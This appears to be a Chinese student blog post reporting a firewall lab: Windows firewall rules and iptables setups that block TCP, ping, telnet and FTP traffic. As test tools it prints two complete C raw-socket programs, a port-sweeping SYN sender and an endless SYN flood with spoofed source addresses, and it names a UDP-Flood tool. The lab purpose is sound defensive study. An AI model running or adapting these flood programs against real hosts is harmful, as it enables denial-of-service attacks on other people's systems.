<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>防火墙实验 | Reus09&#39;s Blog</title>
<meta name="keywords" content="网络安全实验">
<meta name="description" content="防火墙实验 0x01 实验目标 选择一种主流的软件防火墙，熟悉其安全规则配置，通过配置防火墙规则，实现以下功能： 过滤远程服务器（R）到本地主机（L）的T">
<meta name="author" content="Reus09">
<link rel="canonical" href="http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="防火墙实验" />
<meta property="og:description" content="防火墙实验 0x01 实验目标 选择一种主流的软件防火墙，熟悉其安全规则配置，通过配置防火墙规则，实现以下功能： 过滤远程服务器（R）到本地主机（L）的T" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-01-01T21:22:48+00:00" />
<meta property="article:modified_time" content="2022-09-11T15:41:19+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="防火墙实验"/>
<meta name="twitter:description" content="防火墙实验 0x01 实验目标 选择一种主流的软件防火墙，熟悉其安全规则配置，通过配置防火墙规则，实现以下功能： 过滤远程服务器（R）到本地主机（L）的T"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "📚文章",
      "item": "http://www.reus09.top/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "👨🏻‍💻技术",
      "item": "http://www.reus09.top/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "防火墙实验",
      "item": "http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "防火墙实验",
  "name": "防火墙实验",
  "description": "防火墙实验 0x01 实验目标 选择一种主流的软件防火墙，熟悉其安全规则配置，通过配置防火墙规则，实现以下功能： 过滤远程服务器（R）到本地主机（L）的T",
  "keywords": [
    "网络安全实验"
  ],
  "articleBody": "防火墙实验 0x01 实验目标 选择一种主流的软件防火墙，熟悉其安全规则配置，通过配置防火墙规则，实现以下功能：\n过滤远程服务器（R）到本地主机（L）的TCP数据。 过滤R-\u003eL中数据包源端口为21或80的数据，查看现象。 能够由本机登录ftp服务器成功（通过用户名、密码验证） 阻止将ftp内容列表、上传、下载数据。 配置linux系统下iptables防火墙；在linux系统下，配置iptables防火墙，实现如下功能：\nIptables防火墙的启动停止。 Iptables防火墙规则查看、添加、删除。 设置Iptables防火墙的包过滤规则，实现以下功能： 禁止所有进出本地主机的数据包通过；（通过Ping验证） 允许某特定IP主机远程ping本地主机； 允许某特定IP主机远程telnet或putty本地主机。 选做：完成下述功能：\n由本机登录ftp服务器成功（通过用户名、密码验证）； 无法将ftp内容列表或上传、下载数据； 0x02 实验前提 实验前提知识\n防火墙定义：\n防火墙是位于两个（或多个）网络间，实施网间访问控制的一组组件的集合。 防火墙是指隔离在内部网络和外部网络之间的一道防御系统，是这一类防范措施的总称。 防火墙设计目标：\n内部和外部之间的所有网络数据流必须经过防火墙。 只有符合安全策略的数据流，即，经过授权的数据流才能通过防火墙。 防火墙自身不能被攻破。 防火墙经典部署\n防火墙功能模块\n防火墙类型\n包过滤防火墙 包过滤防火墙用规则检测每个IP包，根据结果放行或丢弃这些数据包。 包过滤防火墙一般会配置为双向过滤，即针对进入内部网络和离开内部网络两个方向的数据进行过滤。 过滤规则基于数据包中的信息，例如： 源、目IP地址， 源、目端口，例如：FTP(21)、 HTTP(80) 、DNS(53)… 协议类型，例如：TCP、 UDP、 ICMP 、IGMP… 状态检查防火墙 过滤规则基于数据包中的信息，例如： 网络接口，例如：eth0用于入站，eth1用于出站… IP选项，例如：源路由、记录路由… TCP选项，例如：SYN 、ACK、 FIN 、RST… 数据包流向，例如：入站（in）或出站（out） 电路级代理防火墙 是一个通用代理服务器，它工作于OSI互联模型的会话层或是TCP/IP协议的TCP层。 它适用于多个协议，但它不能识别在同一个协议栈上运行的不同的应用，当然也就不需要对不同的应用设置不同的代理模块，但这种代理需要对客户端作适当修改。 它接受客户端的连接请求，代理客户端完成网络连接，建立起一个回路，对数据包起转发作用，数据包被提交给用户的应用层来处理。 通过电路级网关传递的数据似乎起源于防火墙，隐藏了被保护网络的信息。 应用层代理防火墙 首先，它对该用户的身份进行验证。 若为合法用户，则把请求转发给真正的某个内部网络的主机，同时监控用户的操作，拒绝不合法的访问。 当内部网络向外部网络申请服务时，代理服务器的工作过程刚好相反。 实验环境\nFTP服务器 windows xp IP:192.168.195.162 FTP客户端 以及 Windows防火墙 Windows xp IP:192.168.195.131 Linux 防火墙 Centos 7: 192.168.195.174 实验工具\n发送tcp包到目的机随机端口的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 #include #include #include #include #include #include #include #include #include #include #include #include #include #include struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; struct pseudohdr { unsigned int saddr; unsigned int daddr; char zeros; char protocol; unsigned short length; }; unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u003e 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u003e\u003e 16) + (cksum \u0026 0xffff); cksum += (cksum \u003e\u003e 16); return (unsigned short )(~cksum); } void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u003ever_and_hdrlen = (4\u003c\u003c4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u003etos = 0; ip-\u003etotal_len = htons(len); ip-\u003eid = 1; ip-\u003eflags = 0x40; ip-\u003ettl = 255; ip-\u003eprotocol = IPPROTO_TCP; ip-\u003echecksum = 0; ip-\u003esrcaddr = srcaddr; // 源IP地址 ip-\u003edstaddr = dstaddr; // 目标IP地址 } void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u003esport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u003edport = htons(dport); // 目标端口 tcp-\u003eseq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u003eack_seq = 0; tcp-\u003elen = (sizeof(struct tcphdr) / 4 \u003c\u003c 4 | 0); tcp-\u003eflag = 0x02; tcp-\u003ewin = htons(1024); tcp-\u003echecksum = 0; tcp-\u003eurg = 0; } void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u003ezeros = 0; pseudo-\u003eprotocol = IPPROTO_TCP; pseudo-\u003elength = htons(sizeof(struct tcphdr)); pseudo-\u003esaddr = srcaddr; pseudo-\u003edaddr = dstaddr; } int make_syn_packet(char *packet, int pkt_len, unsigned int daddr,unsigned int saddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 //saddr = inet_addr(\"192.168.195.145\"); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026ip, saddr, daddr); init_tcp_header(\u0026tcp, dport); init_pseudo_header(\u0026pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026tcp, sizeof(tcp)); return len; } int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026on, sizeof(on)) \u003c 0) { close(fd); return -1; } return fd; } int send_syn_packet(int i ,int sockfd, unsigned int addr, unsigned int sddr,unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\"%d 端口已经探测\\n\",i); pkt_len = make_syn_packet(packet, 256, addr,sddr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026skaddr, sizeof(struct sockaddr)); } int main(int argc, char *argv[]) { unsigned int addr; unsigned int sddr; unsigned short port; int sockfd; if (argc \u003c 3) { fprintf(stderr, \"Usage: synflood \\n\"); exit(1); } addr = inet_addr(argv[1]); sddr = inet_addr(argv[2]); sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \"Failed to make raw socket\\n\"); exit(1); } for (int i = 0 ; i \u003c= 1024; i++) { port = i; if (send_syn_packet(i,sockfd, addr,sddr, port) \u003c 0) { fprintf(stderr, \"Failed to send syn packet\\n\"); } i +=1; } close(sockfd); return 0; } 发送tcp包到目的机确定端口的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include #include #include #include #include #include #include #include #include #include #include #include #include #include // ip 报头 struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; // tcp 报头 struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; //TCP的伪报头，在计算TCP的校验和时需要包含 struct pseudohdr { unsigned int saddr; //源目的IP unsigned int daddr; // 目的IP char zeros; // 8位保留字符 一般置0 char protocol;// 协议 unsigned short length; // 长度 }; // 这个是计算校验和的函数 unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u003e 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u003e\u003e 16) + (cksum \u0026 0xffff); cksum += (cksum \u003e\u003e 16); return (unsigned short )(~cksum); } // 通过传入的源 IP 地址和目标 IP 地址初始化 IP 头部结构。 void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u003ever_and_hdrlen = (4\u003c\u003c4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u003etos = 0; ip-\u003etotal_len = htons(len); ip-\u003eid = 1; ip-\u003eflags = 0x40; ip-\u003ettl = 255; ip-\u003eprotocol = IPPROTO_TCP; ip-\u003echecksum = 0; ip-\u003esrcaddr = srcaddr; // 源IP地址 ip-\u003edstaddr = dstaddr; // 目标IP地址 } // 初始化 tcp 包 void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u003esport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u003edport = htons(dport); // 目标端口 tcp-\u003eseq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u003eack_seq = 0; tcp-\u003elen = (sizeof(struct tcphdr) / 4 \u003c\u003c 4 | 0); tcp-\u003eflag = 0x02; // 0x02 代表 是syn 包，tcp三次连接请求的开始 tcp-\u003ewin = htons(1024); tcp-\u003echecksum = 0; tcp-\u003eurg = 0; } // 初始化 tcp 伪报头 void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u003ezeros = 0; pseudo-\u003eprotocol = IPPROTO_TCP; pseudo-\u003elength = htons(sizeof(struct tcphdr)); pseudo-\u003esaddr = srcaddr; pseudo-\u003edaddr = dstaddr; } // 通过 目标IP地址 和 目标端口 生成一个 SYN包，保存到参数 packet 中，并且返回包的大小。 int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026ip, saddr, daddr); init_tcp_header(\u0026tcp, dport); init_pseudo_header(\u0026pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026tcp, sizeof(tcp)); return len; } // 创造原始套接字 int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026on, sizeof(on)) \u003c 0) { close(fd); return -1; } /* 在调用 socket() 函数创建套接字时，指定第二个参数为 SOCK_RAW，表示创建的套接字为原始套接字。然后调用 setsockopt() 函\t数设置 IP 头部由我们自己构建 */ return fd; } // 传入原始套接字、目标IP地址和目标端口，然后通过调用 sendto() 函数向服务端发送一个 SYN包 int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\"%d已攻击!\\n\",addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026skaddr, sizeof(struct sockaddr)); } // 主函数 int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u003c 3) { fprintf(stderr, \"Usage: synflood \\n\"); exit(1); } // argv[1] 目的地址 // argc[2] 目的端口 addr = inet_addr(argv[1]); port = atoi(argv[2]); // 判断端口是否 存在 if (port \u003c 0 || port \u003e 65535) { fprintf(stderr, \"Invalid destination port number: %s\\n\", argv[2]); exit(1); } // 开启socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \"Failed to make raw socket\\n\"); exit(1); } // for 无限循环，发送syn包 for (;;) { if (send_syn_packet(sockfd, addr, port) \u003c 0) { fprintf(stderr, \"Failed to send syn packet\\n\"); } } close(sockfd); return 0; } Windows防火墙：天网防火墙\nLinux防火墙： iptables\nFTP服务器：Ser-U\n抓包工具：Wireshark\nUDP攻击：UDP-Flood\n0x03 实验内容 3.1 windows防火墙 3.1.1 过滤远程服务器（R）到本地主机（L）的TCP数据 在防火墙中添加如下规则： 这样接收到的所有TCP包都会被拦截，并且被记录。 没有开启防火墙前，在终端执行发送随机端口的tcp程序 通过Wireshark抓包，我们可以看到此时的TCP包并没有被拦截。 开启防火墙，再度启动程序。 可以看到防火墙进行提醒，并且日志里面显示了攻击机向靶机192.168.195.131的端口tcp连接。 因此加上该端口后，所有tcp包都被截断了。 3.1.2 过滤R-\u003eL中数据包源端口为21或80的数据 发送到端口为21和80的传输层协议可能为tcp也可能为udp\n因此编写进出规则的时候，我们需要对TCP和UDP都进行限制。\nUDP TCP 因为我的客户端已经开启了21和80端口，所有我们这里直接选择已授权开放的端口即可。 TCP\n防火墙开启前：\n可以看到TCP包可以发到机器。 开启防火墙\n攻击80端口\n可以看到在日志里面程序连接80端口被拒绝。 攻击21端口\n可以看到这里连接21端口同样被拒绝。\nUDP\n关闭防火墙\n攻击80端口\n可以看到抓到udp包\n开启防火墙\n攻击80端口\n可以看到80端口的udp包已被拦截 攻击21端口\n可以看到21端口的udp包已被拦截\n3.1.3 能够由本机登录ftp服务器成功（通过用户名、密码验证） 在windows xp192.168.195.162中搭建ftp服务器 创建一个ftp用户，账户为admin，密码为admin； 我们在本机访问服务器端 我们成功访问到服务器端。 设置规则 当我们向服务器端发送ftp请求的时候，会通行。 3.1.4 阻止将ftp内容列表、上传、下载数据 这里我们是原先的客户端作为新的服务器，另一台机子来访问这个新的服务器，我们需要在服务区的防火墙上配置规则，从而阻止客户端下载服务器端内容 在新的服务器端配置FTP 客户端查看效果 在服务器端配置防护墙规则 当收到端口为21的tcp请求的时候拒绝该访问，这样就保证了客户端不能从服务器下载。 开启防火墙 结果 我们可以在日志里面看到 IP192.168.195.182对客户端的连接被拒绝 同时，该网页也无法打开，自然查看列表什么的，上传、下载都无法进行， 3.2 Linux防火墙 iptables 3.2.1 Iptables防火墙的启动停止 首先通过以下命令安装好iptables\n1 2 3 4 systemctl stop firewalld.service systemctl mask firewalld.service yum install iptables-services systemctl enable iptables.service 然后通过命令service iptables status查看此时的iptables状态\n此时防火墙为打开状态 关闭防火墙service iptables stop\n再度查看此时防火墙状态 发现此时防火墙已关闭。 打开防火墙service iptables start\n再查看防火墙状态 防火墙已打开 3.2.2 Iptables防火墙规则查看、添加、删除 查看\n命令 iptables -L -n 列出（filter表）所有规则 命令 iptables -nL –line-number 列出（filter表）所有规则，带编号 命令 iptables -L -n -t nat 列出（nat表）所有规则 添加\n添加规则有两个参数：-A和-I。其中-A是添加到规则的末尾；-I可以插入到指定位置，没有指定位置的话默认插入到规则的首部。 当前规则： 添加一条规则到尾部：iptables –A INPUT -j ACCEPT 意思为：向filter表（默认表）的INPUT链中追加一条规则，其功能是接受源地址为任意、目标地址为防火墙本身的所有数据包。 第六条即为我们新加入的规则 添加一条规则到第三条： iptables -I INPUT 3 -s 192.168.195.131 -j DROP 可以看到新规则添加到第三条了 删除\n删除用-D参数\n删除之前添加的规则 iptables -A INPUT -j ACCEPT：\n命令： iptables -D INPUT -j ACCEPT\n可以看到我们之前添加的第七条规则已经被删除。 有时候要删除的规则太长，删除时要写一大串，既浪费时间又容易写错，这时我们可以先使用–line-number找出该条规则的行号，再通过行号删除规则。这里我们删除第三行我们插入的规则。\n命令：iptables -D INPUT 3\n可以看到我们插入的第三条规则已经被删除。\n3.2.3 设置Iptables防火墙的包过滤规则，实现以下功能 3.2.3.1 禁止所有进出本地主机的数据包通过（通过Ping验证） 我们首先将所有规则都删除iptables -F 可以看到我们之前的规则全部被清除掉。 此时我们通过机器192.168.195.131来ping我们此时的Linux主机192.168.195.174 正常可以ping通 禁止所有进入本地机器的数据包通过 命令如下：iptables -I INPUT -j DROP 将规则加入到INPUT链中 所有发给本机的包都会被丢弃掉 此时再度ping我们的本机192.168.195.174 很明显的主机已经接收不到ping的包了 3.2.3.2 允许某特定IP主机远程ping本地主机 将所有规则清零iptables -F\n允许某特定IP主机远程ping本地主机\n我们这里设定运行192.168.195.131可以ping通，其余的主机均无法ping通机器\n命令：\n1 2 iptables -I INPUT -j DROP iptables -I INPUT -s 192.168.195.131 -j ACCEPT 因为iptables中规则的执行为从上到下，所以按照上述给定的程序插入规则。\n结果为：\n这样就保证接收到192.168.195.131的包，其余的包均丢弃。\n这里直接放出两个机器防火墙开启前后ping的状态。\n其他机器 192.168.195.131 3.2.3.3 允许某特定IP主机远程telnet或putty本地主机 将所有规则清零iptables -F\n允许某特定IP主机远程telnet或putty本地主机,，开启端口23 即可\n命令：\n1 2 iptables -I INPUT -p tcp --dport 23 -j DROP iptables -I INPUT -s 192.168.195.131 -p tcp --dport 23 -j ACCEPT 目的端口为23的被丢弃，因为第二条规则顺序在第一条前面，所有先判断是否为特定IP，是的则接受，否则丢弃。 开启防火墙前：\n192.168.195.131\n其他机器：\ntelent均可以正常连接\n开启iptables\n对于192.168.195.131的机器\n发现仍然可以正好连接telnet 对于其他机器\n可以看到连接不到telnet 0x04 选做题 4.1 由本机登录ftp服务器成功（通过用户名、密码验证） 允许本机登录其他服务器的ftp:192.168.195.162\n因此这里的防火墙为output向外面服务器以21端口发送请求。\n命令：iptables -A OUTPUT -p tcp --sport 21 -j ACCEPT\n所有源端口为21 发往外网的包都被允许通过。 执行防火墙之后，我们可以发现我们发往外网21端口的包可以被ACCEPT 然后通过ftp 192.168.195.131 输入账户admin和密码admin 我们成功连接到了ftp服务器。 4.2 无法将ftp内容列表或上传、下载数据 这里我们的Centos 7本身作为一个FTP服务器来等待客户端的连接。\n在本地配置好ftp环境\n可以看到我们的环境已经配置完毕 同时在客户端，我们也可以访问Linux服务器 为了禁止其他用户下载我们linux服务器端的所有数据，也防止上传,即禁止用户访问我们的FTP服务器。\n所以有命令：iptables -I INPUT -p tcp --dport 21 -j DROP 所有目的端口为21的数据包都将被丢弃 此时我们的客户端再度访问我们的Linux FTP 服务器端\n可以看到我们此时已经无法访问该文件夹了。无法访问到我们的Linux服务器 0x05 实验结论 通过对Windows下和Linux下防火墙的配置情况，自己亲自编写防火墙的相关规则，对包过滤防火墙有了进一步的了解和认知。同时针对不同环境下防火墙配置，Linux下的防火墙配置应该比Windwos更为自由，自定义的比较多。 ",
  "wordCount" : "6572",
  "inLanguage": "en",
  "datePublished": "2022-01-01T21:22:48Z",
  "dateModified": "2022-09-11T15:41:19+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://www.reus09.top" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://www.reus09.top/search" title="🔍搜索 (Alt &#43; /)" accesskey=/>
                    <span>🔍搜索</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/" title="🏠主页">
                    <span>🏠主页</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/posts" title="📚文章">
                    <span>📚文章</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/archives/" title="⏱时间轴">
                    <span>⏱时间轴</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/tags" title="🔖标签">
                    <span>🔖标签</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/about" title="🙋🏻‍♂️关于">
                    <span>🙋🏻‍♂️关于</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/links" title="🤝友链">
                    <span>🤝友链</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://www.reus09.top">Home</a>&nbsp;»&nbsp;<a href="http://www.reus09.top/posts/">📚文章</a>&nbsp;»&nbsp;<a href="http://www.reus09.top/posts/tech/">👨🏻‍💻技术</a></div>
    <h1 class="post-title">
      防火墙实验
    </h1>
